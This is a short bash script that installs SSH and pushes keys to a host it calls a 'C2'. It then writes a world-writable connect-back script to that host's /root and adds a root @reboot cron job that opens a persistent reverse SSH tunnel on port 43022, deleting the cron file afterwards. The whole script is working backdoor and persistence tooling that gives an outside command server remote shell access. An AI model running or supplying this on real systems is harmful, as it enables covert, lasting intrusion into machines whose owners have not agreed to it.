#!/bin/bash

#Check for connectivity
echo "### Checking For Internet ###"
if ping -q -c 1 -W 1 1.1.1.1 >/dev/null; then
    echo "IPv4 is up"
    printf "\n"

#Installing deps
if (systemctl -q is-active sshd.service)
then
    echo "### SSH is Installed And Running! ###"
else
    echo "### Installing Dependencies ###"
    sudo apt update && sudo apt upgrade
    sudo apt install openssh-server
    printf "\n"

    echo "### Starting SSH Service & Enabling On Reboot ###"
    sudo systemctl start ssh && sudo systemctl enable ssh
fi
    printf "\n"

#Generate local key
    echo "### Generating 4096 keypair ###"
    ssh-keygen -b 4096
    printf "\n"

#Read input from user
    echo "Please enter your local username"
    echo ">>> You will use this user's account to log in from your C2! <<<"
    read user

#Error checking for user input
    until id "$user" >/dev/null; do
        echo "Please enter your local username";
        read user;
    done
    printf "\n"

    echo "Please enter route to desired C2 host (<username>@<C2 host>)"
    read C2
    printf "\n"

#Transfer local key to C2
    echo "### Copying key to C2 host ###"
    ssh-copy-id $C2
    printf "\n"

#Generating a remote ssh key
   ssh $C2 'ssh-keygen'

#Creating hmu.sh, which should be run on the C2 host. This file transfers the C2 key back to the host and attaches to the SSH session.
echo "### Creating & transferring remote connection script"
echo "ssh-copy-id ${user}@localhost -p 43022 && ssh ${user}@localhost -p 43022" > /home/$user/hmu.sh
sudo chmod 777 /home/$user/hmu.sh 
scp /home/$user/hmu.sh $C2:/root

#Setup cron job + cleanup
    echo "### Setting up cronjob ###"
    echo "@reboot sleep 100 && sudo -u ${user} ssh -f -N -R 43022:localhost:22 ${C2}" >> cronsh
    sudo crontab cronsh
    rm cronsh
    printf "\n"

#Finishing script
    echo "### donezo! Please reboot the machine. ###"

else
    echo "IPv4 is down"

fi